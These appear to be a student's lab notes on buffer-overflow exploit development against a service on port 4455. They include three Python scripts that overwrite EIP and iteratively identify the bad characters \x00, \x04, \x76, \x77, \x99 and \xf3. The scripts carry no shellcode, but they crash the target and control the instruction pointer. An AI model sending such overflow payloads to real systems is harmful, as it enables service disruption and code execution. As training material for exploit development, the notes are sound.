4 & 5. Bad characters: \x00,\x04,\x76,\x77,\x99,\xf3

4. Bad characters

Add all characters (except known bad character \x00) to just after the eip

Here is the code
![7ea501430da7333772cc4134816e2fdd.png](../../../_resources/b07991c22fa24b43a23f1fddb4563879.png)



```python
kali@kali:~/gitWorkspace/exam/bf$ cat 4_bad_chars_original.py 
#!/usr/bin/python

import sys, socket

if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
    sys.exit()

badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )


cmd = "OVRFLW "
filler  = "\x41" * 1493
eip     = "\x42" * 4
bf      = "\x43" * (3000 - len(filler) - len(eip) - len(badchars))
end = "\r\n"

buffer = cmd + filler + eip + badchars + bf + end

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 4455))
s.send(buffer)
s.recv(1024)
s.close()
```

Run the code
![e708a580b4e90e58af9384e7a156ed50.png](../../../_resources/a7029f837a5145589d739756f6ee223b.png)




It crashes with EIP 42424242. It seems that \x04 is a bad character because we see that after 03 comes 0b
![0ed500d4fd73c166d8416893eec14290.png](../../../_resources/08e8a8120d8942ecba5d7f6e53f827d3.png)


Remove \x04. Here is the code
![1d10531863503a55ba026a8cd4ec23c7.png](../../../_resources/45f554ddb44249dcbfcbdec34899e09a.png)






Run the exploit.
![3370cc0b7a74b03bf89ad26a22833ec3.png](../../../_resources/7a188cd086a6497f9e17ce7f80623109.png)


It crashes at 42424242.
![754b3a1e03f757b845fa9b55ad7e4654.png](../../../_resources/8e303ab5c20847199dfcd70630b02ab3.png)

We see that 0x76 is the next bad char.
![bf4c1c4036d28538cf698b4ebf7358d9.png](../../../_resources/2a440768e5144f05a73f2c21adb1d671.png)
![a8e479c8c55016d82f19deb3e25eae07.png](../../../_resources/09744387926e4ba5af3ed272bc71a4f4.png)

Here is the code
![deb16d08eb6a280d3e162b094fc2a0aa.png](../../../_resources/7d8b34118eb54675ad1caa54fa76433d.png)


```python
kali@kali:~/gitWorkspace/exam/bf$ cat 5_bad_chars_only.py 
#!/usr/bin/python

import sys, socket

if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
    sys.exit()

# Took away x00,\x04,\x76,
badchars = (
"\x01\x02\x03\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )


cmd = "OVRFLW "
filler  = "\x41" * 1493
eip     = "\x42" * 4
bf      = "\x43" * (3000 - len(filler) - len(eip) - len(badchars))
end = "\r\n"

buffer = cmd + filler + eip + badchars + bf + end

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 4455))
s.send(buffer)
s.recv(1024)
s.close()
```


Run the exploit
![d242194102e115804d6b78565a6165f5.png](../../../_resources/af2a6ccb1ba9415d9033f4f5bdfab285.png)

It crashes at 42424242
![3551f5f82757da1171cc0d20fe4ce4a8.png](../../../_resources/40c67b54d4d04046a654d2a552e8cc27.png)

We see that \x77 should be the next bad char
![42fb6623d63869a575f16a313567ff19.png](../../../_resources/1b8b79ff6dc14fb39accde3429f98386.png)


Remove \x77 from the exploit and run again.
![e5e658aec228b2d0c8e87b77399d2b5c.png](../../../_resources/79cc6331e9cb4997843f5f85ef2075f7.png)

We see the \x99 is the next bad character
![93a1fbcafaaf2afb7d80c3170444f8f6.png](../../../_resources/64fb637b65f14cb99a2f9e5755a9bb14.png)

Remove \x99 from the exploit and run again. We see it crashes at 42424242
![e9fda769b79eabe517dfc140471221f4.png](../../../_resources/b854c2e534af4f178db8d2e9a2d03ecb.png)

We see \xf3 is the next bad character.
![8a326115f0a8d21cff380a2c09fcccca.png](../../../_resources/0ff009e1fd524e2fad3c1db93143faad.png)

Remove \xf3 and run the expllit again. It crasehs at 42424242
![7d1620d6311e62a035ba43dd27cfe070.png](../../../_resources/4a9e55d01b084600b10a04066488ebb3.png)

There are no more bad characters
![59afbb5aa16d9aefb79e7511793cf146.png](../../../_resources/e640f6038f164d10a3246013d0221be3.png)


The bad characters in this exploit are:
\x00,\x04,\x76,\x77,\x99,\xf3

Here is the final script that does not contain bad characters:

![bf0ad8b89aab5295b4bda34cbb4b3c9d.png](../../../_resources/25c7a62c6c0f47b1a25204ce13811dec.png)


```python
kali@kali:~/gitWorkspace/exam/bf$ cat 5_bad_chars_only.py 
#!/usr/bin/python

import sys, socket

if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
    sys.exit()

# \x00,\x04,\x76,\x77,\x99,\xf3
badchars = (
"\x01\x02\x03\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )


cmd = "OVRFLW "
filler  = "\x41" * 1493
eip     = "\x42" * 4
bf      = "\x43" * (3000 - len(filler) - len(eip) - len(badchars))
end = "\r\n"

buffer = cmd + filler + eip + badchars + bf + end

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 4455))
s.send(buffer)
s.recv(1024)
s.close()
```









